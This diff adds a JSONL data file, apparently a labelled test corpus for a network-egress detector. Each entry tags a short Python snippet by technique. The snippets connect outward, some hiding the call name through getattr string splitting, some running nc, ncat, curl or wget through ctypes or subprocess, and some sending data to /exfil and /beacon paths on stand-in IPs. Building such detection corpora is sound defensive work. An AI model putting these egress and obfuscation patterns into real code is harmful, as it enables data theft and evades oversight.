@@ -1,0 +1,261 @@
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libSystem.B.dylib\")\nlibc.system(b\"curl 10.0.0.5 8000\")\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"c\" + \"on\" + \"nect\")\nf(socket.socket(), (\"10.0.0.5\", 4444))\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"1.2.3.4\", 80))\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"con\" + \"nect\")\nf(socket.socket(), (\"172.16.0.3\", 4444))\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"1.2.3.4\", 5000))\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"con\" + \"nect\")\nf(socket.socket(), (\"1.2.3.4\", 9001))\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.run([\"curl\", \"http://203.0.113.7:5000/beacon\"])\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"ws2_32.dll\")\nlibc.system(b\"ncat 203.0.113.7 443\")\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"203.0.113.7\", 8080))\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.create_connection((\"198.51.100.2\", 4444))\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"c\" + \"on\" + \"nect\")\nf(socket.socket(), (\"1.2.3.4\", 443))\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.create_connection((\"192.168.1.10\", 31337))\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libSystem.B.dylib\")\nlibc.connect(0, 0, 0)\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libSystem.B.dylib\")\nlibc.system(b\"ncat 1.2.3.4 8000\")\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libc.so.7\")\nlibc.connect(0, 0, 0)\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"ws2_32.dll\")\nlibc.connect(0, 0, 0)\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.run([\"ncat\", \"http://172.16.0.3:9001/exfil\"])\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.get(\"http://1.2.3.4:31337/exfil\", params={\"k\": \"v\"})\n"}
+{"mode": "http_client_call", "code": "import urllib.request\nurllib.request.urlopen(\"http://198.51.100.2:4444/upload\", data=b\"x\")\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket, \"create_\" + \"connection\")\nf((\"172.16.0.3\", 4444))\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"con\" + \"nect\")\nf(socket.socket(), (\"172.16.0.3\", 8000))\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"c\" + \"on\" + \"nect\")\nf(socket.socket(), (\"203.0.113.7\", 8080))\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket, \"create_\" + \"connection\")\nf((\"8.8.8.8\", 443))\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.get(\"http://192.168.1.10:9001/beacon\", params={\"k\": \"v\"})\n"}
+{"mode": "subprocess_spawn", "code": "import os\nos.system(\"nc 198.51.100.2 80\")\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"10.0.0.5\", 443))\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.run([\"wget\", \"http://172.16.0.3:8000/upload\"])\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.post(\"http://198.51.100.2:8080/exfil\", data={\"k\": \"v\"})\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libc.so.6\")\nlibc.system(b\"wget 203.0.113.7 80\")\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"c\" + \"on\" + \"nect\")\nf(socket.socket(), (\"192.168.1.10\", 80))\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket, \"create_\" + \"connection\")\nf((\"198.51.100.2\", 8000))\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libSystem.B.dylib\")\nlibc.system(b\"curl 10.0.0.5 5000\")\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"8.8.8.8\", 8080))\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"172.16.0.3\", 4444))\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.post(\"http://172.16.0.3:5000/beacon\", data={\"k\": \"v\"})\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libSystem.B.dylib\")\nlibc.system(b\"ncat 172.16.0.3 443\")\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"c\" + \"on\" + \"nect\")\nf(socket.socket(), (\"192.168.1.10\", 31337))\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.post(\"http://192.168.1.10:443/exfil\", data={\"k\": \"v\"})\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"192.168.1.10\", 31337))\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket, \"create_\" + \"connection\")\nf((\"10.0.0.5\", 9001))\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.Popen([\"ncat\", \"1.2.3.4\", \"5000\"])\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libc.so.6\")\nlibc.system(b\"ncat 198.51.100.2 80\")\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.run([\"nc\", \"http://172.16.0.3:80/upload\"])\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket, \"create_\" + \"connection\")\nf((\"1.2.3.4\", 8000))\n"}
+{"mode": "subprocess_spawn", "code": "import os\nos.system(\"curl 8.8.8.8 80\")\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.Popen([\"nc\", \"203.0.113.7\", \"8000\"])\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libc.so.7\")\nlibc.system(b\"ncat 10.0.0.5 8080\")\n"}
+{"mode": "http_client_call", "code": "import urllib.request\nurllib.request.urlopen(\"http://1.2.3.4:4444/upload\", data=b\"x\")\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.run([\"wget\", \"http://198.51.100.2:5000/data\"])\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.run([\"ncat\", \"http://172.16.0.3:8000/beacon\"])\n"}
+{"mode": "subprocess_spawn", "code": "import os\nos.system(\"nc 8.8.8.8 31337\")\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.get(\"http://203.0.113.7:31337/exfil\", params={\"k\": \"v\"})\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"c\" + \"on\" + \"nect\")\nf(socket.socket(), (\"8.8.8.8\", 8080))\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect_ex((\"1.2.3.4\", 31337))\n"}
+{"mode": "subprocess_spawn", "code": "import os\nos.system(\"nc 10.0.0.5 4444\")\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"203.0.113.7\", 4444))\n"}
+{"mode": "subprocess_spawn", "code": "import os\nos.system(\"curl 172.16.0.3 4444\")\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.post(\"http://172.16.0.3:443/beacon\", data={\"k\": \"v\"})\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"198.51.100.2\", 4444))\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"8.8.8.8\", 80))\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect_ex((\"203.0.113.7\", 443))\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"ws2_32.dll\")\nlibc.system(b\"ncat 198.51.100.2 4444\")\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket, \"create_\" + \"connection\")\nf((\"192.168.1.10\", 5000))\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.Popen([\"wget\", \"192.168.1.10\", \"5000\"])\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.get(\"http://1.2.3.4:9001/upload\", params={\"k\": \"v\"})\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libc.so.6\")\nlibc.system(b\"curl 203.0.113.7 443\")\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.create_connection((\"172.16.0.3\", 31337))\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"ws2_32.dll\")\nlibc.system(b\"nc 203.0.113.7 9001\")\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket, \"create_\" + \"connection\")\nf((\"10.0.0.5\", 8080))\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket, \"create_\" + \"connection\")\nf((\"8.8.8.8\", 8000))\n"}
+{"mode": "subprocess_spawn", "code": "import os\nos.system(\"ncat 198.51.100.2 8000\")\n"}
+{"mode": "http_client_call", "code": "import urllib.request\nurllib.request.urlopen(\"http://198.51.100.2:5000/upload\", data=b\"x\")\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect_ex((\"172.16.0.3\", 9001))\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.get(\"http://192.168.1.10:80/data\", params={\"k\": \"v\"})\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"192.168.1.10\", 443))\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"10.0.0.5\", 8080))\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.get(\"http://198.51.100.2:31337/upload\", params={\"k\": \"v\"})\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect_ex((\"198.51.100.2\", 8000))\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"con\" + \"nect\")\nf(socket.socket(), (\"172.16.0.3\", 80))\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.post(\"http://198.51.100.2:8080/data\", data={\"k\": \"v\"})\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket, \"create_\" + \"connection\")\nf((\"198.51.100.2\", 8080))\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.run([\"wget\", \"http://10.0.0.5:4444/upload\"])\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"con\" + \"nect\")\nf(socket.socket(), (\"198.51.100.2\", 8080))\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"c\" + \"on\" + \"nect\")\nf(socket.socket(), (\"198.51.100.2\", 4444))\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"c\" + \"on\" + \"nect\")\nf(socket.socket(), (\"8.8.8.8\", 443))\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.create_connection((\"172.16.0.3\", 443))\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.get(\"http://203.0.113.7:8000/exfil\", params={\"k\": \"v\"})\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libc.so.6\")\nlibc.system(b\"wget 10.0.0.5 4444\")\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"198.51.100.2\", 80))\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.run([\"ncat\", \"http://8.8.8.8:9001/exfil\"])\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"con\" + \"nect\")\nf(socket.socket(), (\"10.0.0.5\", 4444))\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.create_connection((\"172.16.0.3\", 8080))\n"}
+{"mode": "http_client_call", "code": "import urllib.request\nurllib.request.urlopen(\"http://172.16.0.3:8080/upload\", data=b\"x\")\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.Popen([\"nc\", \"10.0.0.5\", \"31337\"])\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect_ex((\"1.2.3.4\", 443))\n"}
+{"mode": "subprocess_spawn", "code": "import os\nos.system(\"ncat 203.0.113.7 8000\")\n"}
+{"mode": "subprocess_spawn", "code": "import os\nos.system(\"nc 192.168.1.10 8000\")\n"}
+{"mode": "subprocess_spawn", "code": "import os\nos.system(\"ncat 198.51.100.2 9001\")\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"con\" + \"nect\")\nf(socket.socket(), (\"192.168.1.10\", 5000))\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket, \"create_\" + \"connection\")\nf((\"172.16.0.3\", 31337))\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.run([\"curl\", \"http://8.8.8.8:9001/data\"])\n"}
+{"mode": "http_client_call", "code": "import urllib.request\nurllib.request.urlopen(\"http://1.2.3.4:443/upload\", data=b\"x\")\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect_ex((\"198.51.100.2\", 4444))\n"}
+{"mode": "http_client_call", "code": "import urllib.request\nurllib.request.urlopen(\"http://1.2.3.4:8080/exfil\", data=b\"x\")\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.Popen([\"wget\", \"10.0.0.5\", \"8080\"])\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"con\" + \"nect\")\nf(socket.socket(), (\"198.51.100.2\", 80))\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.post(\"http://192.168.1.10:80/data\", data={\"k\": \"v\"})\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libc.so.6\")\nlibc.system(b\"nc 192.168.1.10 8080\")\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libc.so.7\")\nlibc.system(b\"ncat 198.51.100.2 443\")\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket, \"create_\" + \"connection\")\nf((\"203.0.113.7\", 5000))\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket, \"create_\" + \"connection\")\nf((\"198.51.100.2\", 5000))\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"ws2_32.dll\")\nlibc.system(b\"nc 172.16.0.3 8000\")\n"}
+{"mode": "http_client_call", "code": "import urllib.request\nurllib.request.urlopen(\"http://198.51.100.2:80/beacon\", data=b\"x\")\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"con\" + \"nect\")\nf(socket.socket(), (\"10.0.0.5\", 8000))\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.post(\"http://198.51.100.2:8080/upload\", data={\"k\": \"v\"})\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.get(\"http://10.0.0.5:80/exfil\", params={\"k\": \"v\"})\n"}
+{"mode": "http_client_call", "code": "import urllib.request\nurllib.request.urlopen(\"http://203.0.113.7:4444/exfil\", data=b\"x\")\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"1.2.3.4\", 8080))\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"ws2_32.dll\")\nlibc.system(b\"ncat 1.2.3.4 9001\")\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.Popen([\"nc\", \"1.2.3.4\", \"80\"])\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.create_connection((\"10.0.0.5\", 80))\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"ws2_32.dll\")\nlibc.system(b\"curl 172.16.0.3 9001\")\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libc.so.7\")\nlibc.system(b\"curl 8.8.8.8 4444\")\n"}
+{"mode": "subprocess_spawn", "code": "import os\nos.system(\"wget 192.168.1.10 8080\")\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.run([\"curl\", \"http://1.2.3.4:8080/upload\"])\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libc.so.7\")\nlibc.system(b\"ncat 1.2.3.4 4444\")\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.Popen([\"ncat\", \"172.16.0.3\", \"5000\"])\n"}
+{"mode": "subprocess_spawn", "code": "import os\nos.system(\"curl 10.0.0.5 4444\")\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.run([\"curl\", \"http://8.8.8.8:5000/data\"])\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.Popen([\"wget\", \"1.2.3.4\", \"80\"])\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.get(\"http://172.16.0.3:5000/upload\", params={\"k\": \"v\"})\n"}
+{"mode": "subprocess_spawn", "code": "import os\nos.system(\"nc 192.168.1.10 80\")\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.create_connection((\"172.16.0.3\", 4444))\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect_ex((\"10.0.0.5\", 8000))\n"}
+{"mode": "subprocess_spawn", "code": "import os\nos.system(\"curl 1.2.3.4 8080\")\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"ws2_32.dll\")\nlibc.system(b\"nc 198.51.100.2 8000\")\n"}
+{"mode": "subprocess_spawn", "code": "import os\nos.system(\"wget 1.2.3.4 4444\")\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket, \"create_\" + \"connection\")\nf((\"10.0.0.5\", 443))\n"}
+{"mode": "http_client_call", "code": "import urllib.request\nurllib.request.urlopen(\"http://198.51.100.2:8000/exfil\", data=b\"x\")\n"}
+{"mode": "subprocess_spawn", "code": "import os\nos.system(\"nc 198.51.100.2 443\")\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.create_connection((\"1.2.3.4\", 80))\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libc.so.6\")\nlibc.system(b\"ncat 8.8.8.8 80\")\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.get(\"http://192.168.1.10:9001/upload\", params={\"k\": \"v\"})\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"c\" + \"on\" + \"nect\")\nf(socket.socket(), (\"172.16.0.3\", 4444))\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.run([\"nc\", \"http://10.0.0.5:4444/beacon\"])\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.create_connection((\"203.0.113.7\", 31337))\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.run([\"wget\", \"http://8.8.8.8:8000/exfil\"])\n"}
+{"mode": "subprocess_spawn", "code": "import os\nos.system(\"nc 192.168.1.10 443\")\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libc.so.6\")\nlibc.connect(0, 0, 0)\n"}
+{"mode": "subprocess_spawn", "code": "import os\nos.system(\"ncat 203.0.113.7 5000\")\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.Popen([\"ncat\", \"10.0.0.5\", \"5000\"])\n"}
+{"mode": "http_client_call", "code": "import urllib.request\nurllib.request.urlopen(\"http://8.8.8.8:31337/exfil\", data=b\"x\")\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"172.16.0.3\", 5000))\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libc.so.7\")\nlibc.system(b\"curl 203.0.113.7 80\")\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect_ex((\"203.0.113.7\", 31337))\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.Popen([\"curl\", \"198.51.100.2\", \"31337\"])\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"203.0.113.7\", 5000))\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"con\" + \"nect\")\nf(socket.socket(), (\"172.16.0.3\", 9001))\n"}
+{"mode": "subprocess_spawn", "code": "import os\nos.system(\"ncat 8.8.8.8 443\")\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.post(\"http://1.2.3.4:443/beacon\", data={\"k\": \"v\"})\n"}
+{"mode": "subprocess_spawn", "code": "import os\nos.system(\"wget 198.51.100.2 443\")\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.run([\"wget\", \"http://203.0.113.7:9001/exfil\"])\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"con\" + \"nect\")\nf(socket.socket(), (\"203.0.113.7\", 4444))\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libc.so.6\")\nlibc.system(b\"nc 198.51.100.2 9001\")\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.run([\"nc\", \"http://10.0.0.5:80/exfil\"])\n"}
+{"mode": "http_client_call", "code": "import urllib.request\nurllib.request.urlopen(\"http://10.0.0.5:8000/exfil\", data=b\"x\")\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libc.so.7\")\nlibc.system(b\"wget 203.0.113.7 5000\")\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.get(\"http://198.51.100.2:80/upload\", params={\"k\": \"v\"})\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect_ex((\"172.16.0.3\", 80))\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket, \"create_\" + \"connection\")\nf((\"1.2.3.4\", 5000))\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"con\" + \"nect\")\nf(socket.socket(), (\"192.168.1.10\", 9001))\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.create_connection((\"192.168.1.10\", 8080))\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket, \"create_\" + \"connection\")\nf((\"1.2.3.4\", 443))\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"1.2.3.4\", 8000))\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.run([\"ncat\", \"http://10.0.0.5:5000/beacon\"])\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"192.168.1.10\", 80))\n"}
+{"mode": "http_client_call", "code": "import urllib.request\nurllib.request.urlopen(\"http://203.0.113.7:443/upload\", data=b\"x\")\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"192.168.1.10\", 4444))\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libSystem.B.dylib\")\nlibc.system(b\"wget 203.0.113.7 31337\")\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"con\" + \"nect\")\nf(socket.socket(), (\"8.8.8.8\", 5000))\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.create_connection((\"10.0.0.5\", 5000))\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.Popen([\"ncat\", \"192.168.1.10\", \"5000\"])\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"con\" + \"nect\")\nf(socket.socket(), (\"192.168.1.10\", 80))\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"ws2_32.dll\")\nlibc.system(b\"nc 192.168.1.10 8080\")\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libc.so.6\")\nlibc.system(b\"nc 10.0.0.5 443\")\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libc.so.7\")\nlibc.system(b\"wget 203.0.113.7 443\")\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.get(\"http://172.16.0.3:443/upload\", params={\"k\": \"v\"})\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect_ex((\"1.2.3.4\", 80))\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"10.0.0.5\", 5000))\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket, \"create_\" + \"connection\")\nf((\"203.0.113.7\", 80))\n"}
+{"mode": "subprocess_spawn", "code": "import os\nos.system(\"ncat 172.16.0.3 80\")\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libc.so.6\")\nlibc.system(b\"nc 203.0.113.7 8000\")\n"}
+{"mode": "http_client_call", "code": "import urllib.request\nurllib.request.urlopen(\"http://203.0.113.7:8000/exfil\", data=b\"x\")\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.post(\"http://172.16.0.3:80/upload\", data={\"k\": \"v\"})\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.get(\"http://172.16.0.3:443/exfil\", params={\"k\": \"v\"})\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.create_connection((\"198.51.100.2\", 80))\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.post(\"http://172.16.0.3:8000/data\", data={\"k\": \"v\"})\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"c\" + \"on\" + \"nect\")\nf(socket.socket(), (\"203.0.113.7\", 80))\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.run([\"ncat\", \"http://10.0.0.5:9001/upload\"])\n"}
+{"mode": "http_client_call", "code": "import urllib.request\nurllib.request.urlopen(\"http://203.0.113.7:443/exfil\", data=b\"x\")\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"con\" + \"nect\")\nf(socket.socket(), (\"1.2.3.4\", 8000))\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"8.8.8.8\", 8000))\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.post(\"http://198.51.100.2:8000/exfil\", data={\"k\": \"v\"})\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.run([\"ncat\", \"http://203.0.113.7:5000/exfil\"])\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"198.51.100.2\", 443))\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"c\" + \"on\" + \"nect\")\nf(socket.socket(), (\"192.168.1.10\", 8080))\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libc.so.7\")\nlibc.system(b\"wget 8.8.8.8 31337\")\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.Popen([\"wget\", \"10.0.0.5\", \"31337\"])\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket, \"create_\" + \"connection\")\nf((\"203.0.113.7\", 4444))\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.run([\"curl\", \"http://203.0.113.7:9001/beacon\"])\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"con\" + \"nect\")\nf(socket.socket(), (\"1.2.3.4\", 8080))\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"10.0.0.5\", 9001))\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.post(\"http://172.16.0.3:4444/exfil\", data={\"k\": \"v\"})\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"con\" + \"nect\")\nf(socket.socket(), (\"203.0.113.7\", 8000))\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libc.so.7\")\nlibc.system(b\"nc 10.0.0.5 5000\")\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.Popen([\"nc\", \"198.51.100.2\", \"9001\"])\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libc.so.6\")\nlibc.system(b\"wget 192.168.1.10 8000\")\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"ws2_32.dll\")\nlibc.system(b\"nc 8.8.8.8 8080\")\n"}
+{"mode": "subprocess_spawn", "code": "import os\nos.system(\"wget 10.0.0.5 9001\")\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.post(\"http://198.51.100.2:5000/upload\", data={\"k\": \"v\"})\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.run([\"wget\", \"http://1.2.3.4:4444/exfil\"])\n"}
